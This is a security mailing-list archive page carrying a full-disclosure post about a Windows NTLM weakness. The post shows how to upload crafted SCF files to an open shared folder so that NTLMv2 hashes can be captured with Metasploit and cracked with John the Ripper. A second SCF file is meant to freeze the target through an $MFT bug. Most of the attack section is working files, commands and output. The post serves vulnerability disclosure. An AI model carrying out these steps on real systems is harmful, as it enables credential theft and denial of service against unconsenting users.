  oss-security - Hash thief on Windows shared folder with SCF files. NTLM SSO            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [thread-next>] [day] [month] [year] [list]  Date: Mon, 23 Oct From: Juan Diego <diego@...ux.com> To: fulldisclosure@...lists.org, oss-security@...ts.openwall.com,  	bugtraq@...urityfocus.com Subject: Hash thief on Windows shared folder with SCF files. NTLM SSO  Hello,  I want to share some information with the people on the list. On May 24, I found a problem with NTLM auth on Windows.  Under certain circumstances a shared folder on Windows can be abused remotely to obtain the user credentials and to freeze the machine.  This was already reported to MSRC on May 24, and was closed on October 18.  This attack makes use of SCF files, and a shared folder with certain configuration.  -Create a folder anywhere on the system, example on the Desktop -Right click - Properties -Sharing tab -Network and Sharing center -Enable 'Turn off password protected sharing'  Now, you need a crafted SCF file to abuse this, the file looks like this  root@...adminjd:~# cat test.scf [Shell] Command=2 [Taskbar] Command=ToggleDesktop  root@...adminjd:~#  We are going to upload this file to the newly shared folder, we'll use smbclient, but first we need a metasploit console running capture/smb auxiliary module.  root@...adminjd:~# msfconsole -q  msf > use auxiliary/server/capture/smb msf auxiliary(smb) > set JOHNPWFILE /tmp/smbhash.txt JOHNPWFILE = /tmp/smbhash.txt msf auxiliary(smb) > exploit -j [*] Auxiliary module running as background job  [*] Server started. msf auxiliary(smb)   Now we can upload the file  root@...adminjd:~# smbclient WARNING: The "syslog" option is deprecated Enter root's password: OS=[Windows 7 Ultimate Service Pack 1] Server=[Windows 7 Ultimate 6.1] smb: \> cd juan smb: \juan\> cd Desktop\ smb: \juan\Desktop\> cd prueba2\ smb: \juan\Desktop\prueba2\> put test.scf putting file test.scf as \juan\Desktop\prueba2\test.scf kb/s) (average kb/s) smb: \juan\Desktop\prueba2\> ls . D 0 Mon Oct 23 .. D 0 Mon Oct 23 .DS_Store AH Tue May 23 test.scf A 91 Mon Oct 23  blocks of size blocks available smb: \juan\Desktop\prueba2\> root@...adminjd:~#  Our metasploit console should look like this  msf auxiliary(smb) > [*] SMB Captured - NTLMv2 Response Captured from - USER:juan DOMAIN:juan-PC OS: LM: LMHASH:Disabled LM_CLIENT_CHALLENGE:Disabled [*] SMB Captured - NTLMv2 Response Captured from - USER:juan DOMAIN:juan-PC OS: LM: LMHASH:Disabled LM_CLIENT_CHALLENGE:Disabled [*] SMB Captured - NTLMv2 Response Captured from - USER:juan DOMAIN:juan-PC OS: LM: LMHASH:Disabled LM_CLIENT_CHALLENGE:Disabled [*] SMB Captured - NTLMv2 Response Captured from - USER:juan DOMAIN:juan-PC OS: LM: LMHASH:Disabled LM_CLIENT_CHALLENGE:Disabled [*] SMB Captured - NTLMv2 Response Captured from - USER:juan DOMAIN:juan-PC OS: LM: LMHASH:Disabled LM_CLIENT_CHALLENGE:Disabled  I chopped this one to avoid sending too much to the list.  When we started the smb capture module, we passed the option  msf auxiliary(smb) > set JOHNPWFILE /tmp/smbhash.txt  So our hashes are on /tmp/smbhash.txt  Let's try with John  root@...adminjd:~# cd /tmp/ root@...adminjd:/tmp# john smbhash.txt_netntlmv2 Using default input encoding: UTF-8 Rules/masks using Loaded 6 password hashes with 6 different salts (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 Press 'q' or Ctrl-C to abort, almost any other key for status abc (juan) abc (juan) abc (juan) abc (juan) abc (juan) abc (juan) 6g DONE 2/3 abc Use the "--show" option to display all of the cracked passwords reliably Session completed root@...adminjd:/tmp#  That's it, now we have the plain text password for the machine.  If we want to freeze the machine, we can attack via $MFT with a SCF file like this  root@...adminjd:~# cat mft.scf [Shell] Command=2 IconFile= [Taskbar] Command=ToggleDesktop root@...adminjd:~#  Just upload it to the vulnerable folder, and the machine will freeze in a few minutes due to $MFT NTFS issue.  Accordingly to MS, all Windows versions are affected, they released an advisory for this:  It's a partial patch, there are no real fix for this, and the regcode change proposed by MS is only for Windows 10 and Server  I have a better-explained post about this on my blog  English: Spanish:  thanks for your time :)  Best Regards   Juan Diego -------- á§   Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      